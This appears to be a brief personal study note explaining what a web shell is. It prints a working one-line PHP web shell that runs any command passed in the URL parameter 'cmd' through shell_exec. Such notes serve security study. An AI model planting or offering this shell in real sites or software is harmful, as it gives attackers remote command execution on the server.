A script that runs inside a webserver which executes [[Shell]] code on the [[server]]

Can be done through:
- A web form
- URL argument

# Examples:

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Essentially, what this means is that any commands we enter in the URL after `?cmd=` will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.

![[Pasted image 20260509001404.png]]

